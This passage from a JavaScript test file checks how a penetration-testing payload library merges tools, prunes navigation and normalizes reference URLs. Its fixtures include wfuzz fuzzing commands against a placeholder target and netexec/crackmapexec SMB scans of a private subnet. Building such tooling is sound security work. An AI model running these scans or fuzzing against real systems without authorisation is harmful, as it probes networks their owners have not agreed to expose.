  assert.deepEqual(result.snapshot.tools.map(item => item.id), [primary.id]);
  assert.deepEqual(result.snapshot.tools[0].commands.map(item => item.command), [
    'wfuzz -w dirs.txt https://target/FUZZ',
    'wfuzz -w params.txt https://target/?FUZZ=value',
  ]);
  assert.doesNotMatch(JSON.stringify(result.snapshot.toolNavigation), /wfuzz-tool/);
  assert.match(JSON.stringify(result.snapshot.toolNavigation), /wfuzz/);
});

test('tool merges may retire an obsolete source without copying its commands or references', () => {
  const successor = {
    ...tool('netexec', [toolCommand('SMB inventory', 'nxc smb 10.0.0.0/24')]),
    references: ['https://www.netexec.wiki/'],
  };
  const obsolete = {
    ...tool('crackmapexec', [toolCommand('Legacy SMB inventory', 'crackmapexec smb 10.0.0.0/24')]),
    references: ['https://example.invalid/obsolete-tool'],
  };
  const result = curatePayloadLibrary({
    payloads: [],
    tools: [successor, obsolete],
    navigation: [],
    toolNavigation: [{
      id: 'network-tools',
      name: i18n('网络工具', 'Network Tools'),
      children: [
        { id: 'netexec-nav', name: successor.name, toolId: successor.id },
        { id: 'crackmapexec-nav', name: obsolete.name, toolId: obsolete.id },
      ],
    }],
  }, {
    toolMerges: [{
      sourceToolId: obsolete.id,
      targetToolId: successor.id,
      includeSourceCommands: false,
      includeSourceReferences: false,
    }],
  });

  assert.deepEqual(result.snapshot.tools.map(item => item.id), [successor.id]);
  assert.deepEqual(result.snapshot.tools[0].commands.map(item => item.command), ['nxc smb 10.0.0.0/24']);
  assert.deepEqual(result.snapshot.tools[0].references, ['https://www.netexec.wiki/']);
  assert.doesNotMatch(JSON.stringify(result.snapshot.toolNavigation), /crackmapexec/);
});

test('reference normalization replaces confirmed dead URLs and preserves unknown sources', () => {
  assert.deepEqual(normalizeReferenceUrls([
    'https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/test-wsman',
    'https://learn.microsoft.com/en-us/powershell/module/microsoft.wsman.management/test-wsman',
    'https://example.test/current-reference',
  ]), [
    'https://learn.microsoft.com/en-us/powershell/module/microsoft.wsman.management/test-wsman',
    'https://example.test/current-reference',
  ]);
});
